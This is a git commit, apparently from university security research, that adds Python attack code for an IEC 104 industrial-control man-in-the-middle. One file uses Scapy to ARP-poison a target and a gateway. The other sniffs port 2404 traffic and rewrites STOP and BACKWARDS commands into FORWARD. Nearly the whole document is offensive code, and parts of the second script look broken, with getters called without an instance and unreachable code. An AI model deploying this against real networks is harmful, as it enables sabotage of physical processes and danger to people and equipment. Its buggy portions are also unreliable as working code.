bd5df1f06d55316262430d501844dee89b2ad439
Paul NOIRET <paul.noiret@telecom-sudparis.eu>
2020-01-20 00:49:46 +0100

    upload of the code for the MiTM

---
+++ IEC104_MiTM/atk/ARP_poisoning.py
@@ -0,0 +1,124 @@
+#!/etc/usr/python3
+
+import sys
+import os
+import time
+from scapy.all import *
+from scapy.layers.l2 import ARP, Ether
+
+
+class ARP_poisoning:
+    filter_ = "ip"
+    interface = "eno1"
+    target_ip = "192.168.20.11"
+    router_ip = "192.168.20.10"
+    attack_ip = "192.168.20.15"
+    forward_ip = False  # change this to True if you use this with other MiTM attack
+
+    def set_filter(self, filter):
+        self.filter_ = filter
+
+    def set_interface(self, interface):
+        self.interface = interface
+
+    def set_ipdest(self, ipdest):
+        self.target_ip = ipdest
+
+    def set_ipsrc(self, ipsrc):
+        self.attack_ip = ipsrc
+
+    def set_iprouter(self, iprouter):
+        self.router_ip = iprouter
+
+    def get_filter(self, filter):
+        return self.filter_
+
+    def get_interface(self, interface):
+        return self.interface
+
+    def get_ipdest(self, ipdest):
+        return self.target_ip
+
+    def get_ipsrc(self, ipsrc):
+        return self.attack_ip
+
+    def get_iprouter(self, iprouter):
+        return self.router_ip
+
+    # In case you don't know your target MAC address
+    def get_mac(self, ipdest):
+        conf.verb = 0  # Verbosity level
+        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipdest), timeout=1, iface=self.interface, inter=0.1)
+        for snd, rcv in ans:
+            return rcv.sprintf(r"%Ether.src%")
+
+    def arp_injection(self, router_MAC, sensor_MAC):
+        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=sensor_MAC))
+        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=router_MAC))
+
+    # IP_Forwardind for routing packets during MiTM attacks
+    # Comment to use it with MAC
+
+    def stop_ip_forward(self):
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+    def start_ip_forward(self):
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    # if there is any probleme you can restore your network with this function then start again
+    def restore_arp_tables(self):
+        print("\n[*] Restoring Targets...")
+        victimMac = self.get_mac(self.target_ip)
+        gateMac = self.get_mac(self.router_ip)
+        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac), count=10)
+        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMac), count=10)
+        if (self.forward_ip):
+            print("[*] Disabling IP Forwarding...")
+            self.stop_ip_forward()
+        print("[*] Shutting Down...")
+        sys.exit(1)
+
+    def poisoning(self):
+        sensor_MAC = ""
+        router_MAC = ""
+
+        if (self.forward_ip):
+            print("\n[*] Enabling IP Forwarding...\n")
+        self.start_ip_forward()
+        print("Trying to get MAC of : victim: " + self.target_ip)
+
+        try:
+            sensor_MAC = self.get_mac(self.target_ip)
+        except Exception:
+            if (self.forward_ip):
+                self.stop_ip_forward()
+                print("/!\ Couldn't Find Victim MAC Address")
+                print("/!\ Exiting...")
+                sys.exit(1)
+        print("found MAC of : victim: " + sensor_MAC)
+        print("Trying to get MAC of : gateway: " + self.router_ip)
+        try:
+            router_MAC = self.get_mac(self.router_ip)
+        except Exception:
+            if (self.forward_ip):
+                self.stop_ip_forward()
+                print("/!\ Couldn't Find Gateway MAC Address")
+                print("/!\ Exiting...")
+                sys.exit(1)
+        print("found MAC of : gateway: " + router_MAC)
+        print("[*] Poisoning Targets...")
+        # Send the packets
+        while 1:
+            try:
+                self.arp_injection(router_MAC, sensor_MAC)
+                time.sleep(1)
+            # Stop the program and restore the network
+            except KeyboardInterrupt:
+                self.restore_arp_tables()
+                break
+
+
+# main
+if __name__ == '__main__':
+    instance = ARP_poisoning()
+    instance.poisoning()
---
+++ IEC104_MiTM/atk/mitm_new.py
@@ -0,0 +1,110 @@
+#!/usr/bin/python3
+
+"""
+    Use scapy to modify packets going through your machine.
+    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
+"""
+
+
+from ARP_poisoning import *
+
+
+ip_router = ARP_poisoning.get_iprouter()
+ip_target= ARP_poisoning.get_ipdest()
+mac_router=ARP_poisoning.get_mac(ip_router)
+mac_target=ARP_poisoning.get_mac(ip_target)
+
+interface = "eno1"
+
+## Def vars for our needed paquets
+
+LENGTH_APCI=6
+ASDU_TYPE_BYTE=1
+ASDU_ACT_ORDER_VALUE_BYTE=9 
+ASDU_ACT_ORDER_VALUE_LENGTH=2 
+
+ASDU_TYPE_ACT_CHAR="\x31"
+ASDU_ACT_ORDER_STOP_VALUE_STR="\x00\x00"
+ASDU_ACT_ORDER_BACKWARDS_VALUE_STR="\x07\x00"
+ASDU_ACT_ORDER_FORWARD_VALUE_STR="\xe7\x00"
+
+	
+
+def modify_stop_packet(chosen_packet):
+	#get a list of bytes from the payload
+	copied_packet_payload_list=list(str(chosen_packet[TCP].payload))
+	print("\t before : "+"".join(copied_packet_payload_list).encode("hex"))
+	#modify the 2bytes to the FORWARD value
+	copied_packet_payload_list[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]=ASDU_ACT_ORDER_FORWARD_VALUE_STR
+	new_payload="".join(copied_packet_payload_list)
+	#put the changed payload in the original packet
+	chosen_packet[TCP].payload=Raw(new_payload)
+	print("\t after  : "+new_payload.encode("hex"))
+	#TODO : change the mac_dst address!
+	
+	#delete the checksum so that scapy will handle them and recalculate them
+	del chosen_packet[IP].chksum 
+	del chosen_packet[TCP].chksum
+	#print(chosen_packet.show2())
+
+def is_104_packet_from_controller(packet):
+	if packet.haslayer(TCP) and (packet[TCP].dport ==2404) and (len (packet[TCP].payload) >0 )   :
+		return True
+	else:
+		return False
+
+def is_STOP_order_packet(chosen_packet):
+	if( not is_104_packet_from_controller(chosen_packet)):
+		return False
+	payload_packet=str(chosen_packet[TCP].payload)
+	asdu_type=payload_packet[LENGTH_APCI:LENGTH_APCI+ASDU_TYPE_BYTE]
+	if(asdu_type == ASDU_TYPE_ACT_CHAR):
+		asdu_order_value=payload_packet[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]
+		if(asdu_order_value == ASDU_ACT_ORDER_STOP_VALUE_STR or asdu_order_value ==ASDU_ACT_ORDER_BACKWARDS_VALUE_STR):
+			return True
+			modify_stop_packet(chosen_packet)
+
+	return False
+
+
+def callback_sniff(packet):
+	#packet[Ether].src == MAC_CONTROLLER and
+	if(packet[Ether].src == mac_router and packet[IP].src==ip_router and packet[IP].dst==ip_target):
+		#print("c->p")
+
+		if packet.haslayer(TCP) and is_STOP_order_packet(packet):
+			modify_stop_packet(packet)
+#	else:
+#		print("not TCP")
+#		print(packet.summary())
+		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)
+
+
+
+	if(packet[Ether].src == mac_target and packet[IP].src==ip_target and packet[IP].dst==ip_router):
+		#print("p->c")		
+#	else:
+#		print("not TCP")
+#		print(packet.summary())
+		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)
+
+def loop_sleep():
+	while 1:
+		try:
+			time.sleep(1.5)
+		except KeyboardInterrupt:
+			break
+
+def main_sniff():
+
+	print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
+	sniff(prn=callback_sniff,filter="ip")
+
+	start_ip_forward()
+	print("MitM with full forward until ctrl-c")
+	loop_sleep()
+	print("")
+	stop_ip_forward()
+
+if __name__ == "__main__":
+    main_sniff()
